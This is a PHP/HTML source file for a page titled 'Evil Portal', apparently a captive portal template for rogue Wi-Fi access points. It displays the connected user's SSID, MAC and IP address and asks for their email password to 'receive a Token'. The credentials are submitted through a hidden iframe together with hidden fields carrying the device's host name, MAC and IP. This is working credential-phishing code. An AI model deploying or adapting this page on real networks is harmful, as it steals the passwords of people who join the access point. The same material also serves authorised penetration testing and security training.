<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>

<HTML>
    <HEAD>
        <title>Evil Portal</title>
        <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
        <meta http-equiv="Pragma" content="no-cache" />
        <meta http-equiv="Expires" content="0" />
        <meta name="viewport" content="width=device-width, initial-scale=1">
    </HEAD>

    <BODY>
        <div style="text-align: center;">
            <h1>Evil Portal</h1>
            <p>This is the default Evil Portal page.</p>
            <p>The SSID you are connected to is <?=getClientSSID($_SERVER['REMOTE_ADDR']);?></p>
            <p>Your host name is <?=getClientHostName($_SERVER['REMOTE_ADDR']);?></p>
            <p>Your MAC Address is <?=getClientMac($_SERVER['REMOTE_ADDR']);?></p>
            <p>Your internal IP address is <?=$_SERVER['REMOTE_ADDR'];?></p>
            <br>
            <p><b>Please enter your Email Address and Password to receive a Token</b></p>

            <form method="POST" action="/captiveportal/index.php" target="hiddenFrame">
            <input id='email-input' name="email" type="email" class='g-input' placeholder="E-Mail" autofocus="true" autocorrect="off" autocomplete="on" autocapitalize="off"  required>
            <br><br>
            <input id='pw-input' name='gpw' type="password" class='g-input' placeholder="Password" autofocus="true" autocorrect="off" autocomplete="on" autocapitalize="off"  required>
            <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
				<input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
				<input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
            <input type="hidden" name="gettoken" value="gettoken">
            <br><br>
            <button type="submit">Get Token</button>
            </form>
            
            <form method="POST" action="/captiveportal/index.php">
            <h1>Token</h1>
            <p>Enter Your Token</p>
            <p>Your Token has been send to your E-Mail<br>Enter the Token to continue </p>
            <input name='token' id='token-input' type="text" class='g-input' placeholder="TOKEN" autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off"  required>
				<input type="hidden" name="getaccess" value="getaccess">
				<input type="hidden" name="target" value="<?=$destination?>">
				<br><br>
            <button type="submit">Authorize</button>
            </form>
        </div>
         <iframe name="hiddenFrame" width="0" height="0" border="0" style="display: none;"></iframe> <!-- Hidden Target Frame -->
    </BODY>

</HTML>
